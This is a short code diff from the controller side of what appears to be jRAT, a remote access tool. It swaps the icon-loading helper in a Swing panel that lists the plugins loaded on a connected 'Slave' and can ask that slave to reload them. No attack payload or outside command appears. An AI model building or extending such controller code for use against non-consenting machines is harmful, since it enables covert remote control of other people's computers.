@@ -1,6 +1,6 @@
 package jrat.controller.ui.panels;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet89LoadedPlugins;
 import jrat.controller.ui.DefaultJTable;
@@ -39,7 +39,7 @@ public class PanelControlLoadedPlugins extends PanelControlParent {
 				slave.addToSendQueue(new Packet89LoadedPlugins());
 			}
 		});
-		btnReload.setIcon(IconUtils.getIcon("update"));
+		btnReload.setIcon(Resources.getIcon("update"));
 
 		JButton btnClear = new JButton("Clear");
 		btnClear.addActionListener(new ActionListener() {
@@ -47,7 +47,7 @@ public class PanelControlLoadedPlugins extends PanelControlParent {
 				clear();
 			}
 		});
-		btnClear.setIcon(IconUtils.getIcon("clear"));
+		btnClear.setIcon(Resources.getIcon("clear"));
 		GroupLayout groupLayout = new GroupLayout(this);
 		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 599, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnReload).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear))).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
 		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 303, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear)).addContainerGap(18, Short.MAX_VALUE)));
